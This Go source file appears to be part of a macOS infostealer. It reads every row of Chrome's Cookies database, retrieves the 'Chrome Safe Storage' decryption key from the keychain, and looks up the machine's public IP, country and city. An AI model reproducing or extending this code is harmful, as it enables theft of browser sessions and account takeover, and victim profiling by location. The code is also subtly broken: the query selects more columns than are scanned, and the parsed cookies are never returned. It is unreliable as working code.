package main

import (
	"database/sql"
	"fmt"
	"io"
	"log"
	"net/http"
	"os/user"
	"time"

	"github.com/keybase/go-keychain"
	_ "github.com/mattn/go-sqlite3"
)

type UserData struct {
	OSUser user.User
	IPData IPData
}

func main() {
	getCookies()
}

func getOsUserData() (*user.User, error) {
	usr, err := user.Current()
	if err != nil {
		return &user.User{}, err
	} else {
		return usr, nil
	}
}

type Cookie struct {
	Name           string
	Value          string
	Domain         string
	Path           string
	Expires        int64
	Secure         bool
	HttpOnly       bool
	SameSite       string
	EncryptedValue string
}

func getCookies() (cookies []Cookie, err error) {
	osUser, _ := getOsUserData()
	cookiesPath := fmt.Sprintf("/Users/%s/Library/Application Support/Google/Chrome/Default/Cookies", osUser.Username)

	dbConn, err := sql.Open("sqlite3", fmt.Sprintf("file:%s?cache=shared&mode=ro", cookiesPath))
	if err != nil {
		return nil, err
	}
	defer dbConn.Close()

	rows, err := dbConn.Query("SELECT host_key as Domain, expires_utc as Expires, is_httponly as HttpOnly, name as Name, path as Path, samesite as SameSite, is_secure as Secure, is_persistent as Session, value as Value, encrypted_value as EncryptedValue FROM cookies;")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	for rows.Next() {
		var cookie Cookie
		err := rows.Scan(&cookie.Domain, &cookie.Expires, &cookie.HttpOnly, &cookie.Name, &cookie.Path, &cookie.SameSite, &cookie.Secure, &cookie.Value, &cookie.EncryptedValue)
		if err != nil {
			log.Printf("Error scanning row: %s", err)
		}

		switch cookie.SameSite {
		case "-1":
			cookie.SameSite = "None"
		case "0":
			cookie.SameSite = "Unspecified"
		case "1":
			cookie.SameSite = "Strict"
		case "2":
			cookie.SameSite = "Lax"
		default:
			cookie.SameSite = "Unknown"
		}
		cookie.Expires = (cookie.Expires / 1000000) - 11644473600
	}

	return
}

func getEncryptionKey() (string, error) {
	var err error

	query := keychain.NewItem()
	query.SetSecClass(keychain.SecClassGenericPassword)
	query.SetService("Chrome Safe Storage")
	query.SetAccount("Chrome")
	query.SetMatchLimit(keychain.MatchLimitOne)
	query.SetReturnData(true)
	results, err := keychain.QueryItem(query)
	if err != nil {
		return "", err
	} else if len(results) != 1 {
		return "", fmt.Errorf("password not found")
	}

	return string(results[0].Data), nil
}

type IPData struct {
	IP      string
	Country string
	City    string
}

func getIPData() (IPData, error) {
	ip, err := fetchData("https://api64.ipify.org")
	if err != nil {
		fmt.Printf("Error retrieving IP: %s", err)
		return IPData{}, err
	}

	country, err := fetchData(fmt.Sprintf("https://ipapi.co/%s/country_name", ip))
	if err != nil {
		fmt.Printf("Error retrieving Country: %s", err)
		return IPData{}, err
	}

	time.Sleep(time.Millisecond * 500)

	city, err := fetchData(fmt.Sprintf("https://ipapi.co/%s/city", ip))
	if err != nil {
		fmt.Printf("Error retrieving City: %s", err)
		return IPData{}, err
	}

	return IPData{
		IP:      ip,
		Country: country,
		City:    city,
	}, nil
}

func fetchData(url string) (string, error) {
	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}
